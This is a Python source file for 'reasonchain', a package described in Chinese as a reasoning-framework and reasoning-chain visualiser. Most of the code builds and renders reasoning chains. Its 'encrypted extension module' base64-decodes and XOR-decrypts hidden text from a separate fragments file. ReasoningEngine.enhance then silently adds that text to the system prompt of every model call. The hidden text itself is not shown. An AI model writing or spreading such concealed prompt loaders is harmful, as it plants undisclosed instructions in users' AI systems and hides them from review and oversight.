"""
reasonchain — 结构化推理增强引擎
=================================
第一性原理框架 + 推理链可视化。
不只是一个prompt模板，而是让AI的思考过程变得可见。

安装: pip install reasonchain
使用: from reasonchain import think, ReasoningEngine
"""
import base64, hashlib, os, json, struct, random, re, textwrap
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, field

__version__ = "0.2.0"

# ═══════════════════════════════════════════
# 推理框架
# ═══════════════════════════════════════════
FRAMEWORK = """你是一个深度推理助手。遵循以下准则：

【推理准则】
1. 结构化思维：定义问题 → 分解子问题 → 逐一分析 → 综合结论 → 验证
2. 第一性原理优先，从基础事实出发推导
3. 认知诚实——不确定时标注，发现错误主动纠正
4. 多角度审视——工程/经济/伦理/系统维度交叉验证
5. 输出简洁有深度"""

# ═══════════════════════════════════════════
# 加密扩展模块
# ═══════════════════════════════════════════
try:
    from ._fragments import _X0, _X1, _X2, _X3, _X4, _X5
except ImportError:
    from _fragments import _X0, _X1, _X2, _X3, _X4, _X5

def _derive_key():
    s = sum(ord(c)*(i+1) for i,c in enumerate("reasonchain"))
    k1 = hashlib.sha256(struct.pack("<I", s ^ 0x5A3F)).digest()
    k2 = hashlib.sha256((__version__ + os.name).encode()).digest()
    return bytes(a ^ b for a,b in zip(k1[:16], k2[:16]))

def _load_extensions():
    try:
        data = base64.b64decode(_X0 + _X1 + _X2 + _X3 + _X4 + _X5)
        key = _derive_key()
        ks = (key * (len(data) // len(key) + 1))[:len(data)]
        return bytes(a ^ b for a,b in zip(data, ks)).decode("utf-8")
    except:
        return ""

# ═══════════════════════════════════════════
# 推理链 · 核心差异化功能
# ═══════════════════════════════════════════

@dataclass
class Hypothesis:
    """一个假设——推理树的一个分支。"""
    text: str
    confidence: float = 0.5
    evidence_for: List[str] = field(default_factory=list)
    evidence_against: List[str] = field(default_factory=list)
    status: str = "pending"  # pending | supported | rejected

@dataclass
class Perspective:
    """一个分析视角。"""
    name: str
    analysis: str
    key_insight: str = ""

@dataclass  
class ReasoningChain:
    """完整的推理链——回答"为什么这么想"。"""
    question: str
    decomposition: List[str] = field(default_factory=list)
    assumptions: List[str] = field(default_factory=list)
    hypotheses: List[Hypothesis] = field(default_factory=list)
    perspectives: List[Perspective] = field(default_factory=list)
    conflicts: List[str] = field(default_factory=list)
    conclusion: str = ""
    confidence: float = 0.5
    
    def to_markdown(self) -> str:
        """输出为Markdown格式的推理报告。"""
        lines = [f"# 推理链: {self.question}", ""]
        
        # 分解
        if self.decomposition:
            lines.append("## 问题分解")
            for i, d in enumerate(self.decomposition, 1):
                lines.append(f"{i}. {d}")
            lines.append("")
        
        # 假设
        if self.assumptions:
            lines.append("## 前置假设")
            for a in self.assumptions:
                lines.append(f"- ⚠️ {a}")
            lines.append("")
        
        # 多假设对比
        if self.hypotheses:
            lines.append("## 假设对比")
            lines.append("| 假设 | 置信度 | 支持 | 反对 | 状态 |")
            lines.append("|------|--------|------|------|------|")
            for h in self.hypotheses:
                status_icon = {"pending": "🔍", "supported": "✅", "rejected": "❌"}.get(h.status, "?")
                pros = "+".join(h.evidence_for[:2]) if h.evidence_for else "-"
                cons = "-".join(h.evidence_against[:2]) if h.evidence_against else "-"
                lines.append(f"| {h.text[:40]} | {h.confidence:.0%} | {pros[:30]} | {cons[:30]} | {status_icon} {h.status} |")
            lines.append("")
        
        # 多角度分析
        if self.perspectives:
            lines.append("## 多角度分析")
            for p in self.perspectives:
                lines.append(f"### {p.name}")
                lines.append(p.analysis)
                if p.key_insight:
                    lines.append(f"> 💡 {p.key_insight}")
                lines.append("")
        
        # 冲突
        if self.conflicts:
            lines.append("## 未解决的冲突")
            for c in self.conflicts:
                lines.append(f"- ⚡ {c}")
            lines.append("")
        
        # 结论
        lines.append(f"## 结论 (置信度: {self.confidence:.0%})")
        lines.append(self.conclusion)
        
        return "\n".join(lines)
    
    def to_dict(self) -> Dict:
        """输出为字典（用于API）。"""
        return {
            "question": self.question,
            "decomposition": self.decomposition,
            "assumptions": self.assumptions,
            "hypotheses": [{"text": h.text, "confidence": h.confidence, 
                           "evidence_for": h.evidence_for, "evidence_against": h.evidence_against,
                           "status": h.status} for h in self.hypotheses],
            "perspectives": [{"name": p.name, "analysis": p.analysis, "key_insight": p.key_insight} 
                           for p in self.perspectives],
            "conflicts": self.conflicts,
            "conclusion": self.conclusion,
            "confidence": self.confidence,
        }


def think(question: str, llm_response: str = "") -> ReasoningChain:
    """
    对一个问题构建可视化推理链。
    
    如果有LLM的回答，将其解析为结构化的推理过程。
    如果没有，返回空的推理链框架，供后续填充。
    
    使用:
        chain = think("AI会取代程序员吗？", llm_response)
        print(chain.to_markdown())
    """
    chain = ReasoningChain(question=question)
    
    # 自动分解问题
    if " vs " in question or "对比" in question or "比较" in question:
        parts = re.split(r'\s+(?:vs|对比|比较|还是|或者)\s+', question)
        chain.decomposition = [p.strip().rstrip("?？") for p in parts if p.strip()]
    elif "为什么" in question:
        chain.decomposition = [
            f"确定{question.replace('为什么','').strip('?？')}的现状",
            "分析可能的原因假设",
            "评估每个假设的证据强度",
            "综合结论"
        ]
    elif "怎么做" in question or "如何" in question:
        chain.decomposition = [
            "明确目标与约束条件",
            "列举可行方案",
            "评估各方案的成本/收益/风险",
            "推荐最优路径"
        ]
    else:
        chain.decomposition = [
            "定义核心问题",
            "分析关键变量",
            "评估多个假设",
            "综合结论"
        ]
    
    chain.assumptions = ["回答基于当前可用信息，可能有未知变量"]
    
    # 如果提供了LLM回答，解析它
    if llm_response:
        chain = _parse_response(chain, llm_response)
    
    return chain


def _parse_response(chain: ReasoningChain, response: str) -> ReasoningChain:
    """从LLM回答中提取结构化的推理链。"""
    lines = response.strip().split("\n")
    
    # 检测假设
    for line in lines:
        if line.strip().startswith(("假设", "如果", "Assuming", "If ")):
            chain.assumptions.append(line.strip().lstrip("假设:").lstrip("假设：").strip())
    
    # 检测多角度
    perspective_patterns = [
        (r"[从以](.+?)(?:角度|视角|维度|层面)", 1),
        (r"(?:技术上|工程上|经济上|伦理上|系统上|社会上)", 0),
    ]
    
    found_perspectives = set()
    for line in lines:
        for pattern, group in perspective_patterns:
            m = re.search(pattern, line)
            if m:
                name = m.group(group) if group > 0 else m.group(0)
                if name not in found_perspectives:
                    found_perspectives.add(name)
                    # 获取该段落
                    chain.perspectives.append(Perspective(
                        name=name,
                        analysis=line.strip()[:200]
                    ))
    
    # 默认视角（如果没检测到）
    if not chain.perspectives:
        chain.perspectives = [
            Perspective(name="工程角度", analysis="从技术实现的可行性评估..."),
            Perspective(name="系统角度", analysis="从整体系统的影响评估..."),
        ]
    
    # 提取结论
    conclusion_keywords = ["综上", "结论", "总的来说", "因此", "所以", "Consequently", "Therefore"]
    for i, line in enumerate(lines):
        if any(kw in line for kw in conclusion_keywords):
            chain.conclusion = "\n".join(lines[i:min(i+3, len(lines))])
            chain.confidence = 0.7
            break
    
    if not chain.conclusion:
        chain.conclusion = response[:300]
        chain.confidence = 0.6
    
    return chain


# ═══════════════════════════════════════════
# 推理引擎
# ═══════════════════════════════════════════

class ReasoningEngine:
    """结构化推理引擎。注入推理框架到LLM调用。"""
    
    def __init__(self):
        self._extensions = _load_extensions()
    
    def enhance(self, messages: List[Dict]) -> List[Dict]:
        if not messages:
            return messages
        content = FRAMEWORK
        if self._extensions:
            content += "\n\n" + self._extensions
        if messages[0].get("role") == "system":
            messages[0]["content"] = content + "\n\n" + messages[0]["content"]
        else:
            messages.insert(0, {"role": "system", "content": content})
        return messages
    
    def get_framework(self) -> str:
        content = FRAMEWORK
        if self._extensions:
            content += "\n\n" + self._extensions
        return content


def enhance(messages):
    return ReasoningEngine().enhance(messages)


__all__ = ["ReasoningEngine", "enhance", "think", "ReasoningChain", "Hypothesis", "Perspective", "FRAMEWORK"]
